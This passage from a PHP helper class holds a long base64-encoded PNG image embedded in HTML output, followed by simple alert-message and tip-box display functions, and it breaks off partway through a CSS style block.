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"></div>');
	}

	public static function message ($msg , $type = 'die') {
		if ($type == 'die') {
			die("<script>window.alert('" . $msg . "');history.go(-1);</script>");
		} else if ($type == 'echo') {
			self::htmlOut("<script>window.alert('" . $msg . "');</script>");
		}
	}

	public static function tips ($content , $url) {
		$result = <<<EOF
<style>body,html{height:100%;}body{background-color:#fff;}.layer-tip-box{position:fixed;top:20%;left:50%;transform:translate(-50%,0);color:#333;font-size:18px;background:#fff;border-radius:4px;border:1px solid #ccc;width:500px;box-shadow:0 0 8px rgba(91,91,91,.6);}.layer-tip-box .title{padding:0 10px;height:45px;line-height:45px;font-size:14px;color:#666;border-bottom:1px solid #ccc;position:relative;}.layer-tip-box .title .tool{position:absolute;right:10px;top:0;}.layer-tip-box .title .tool span{width:18px;display:inline-block;text-align:center;font-size:17px;}.layer-tip-box .title .tool span:last-child{font-size:20px;margin-top:-1px;vertical-align:top;}.layer-tip-box .content{padding:10px 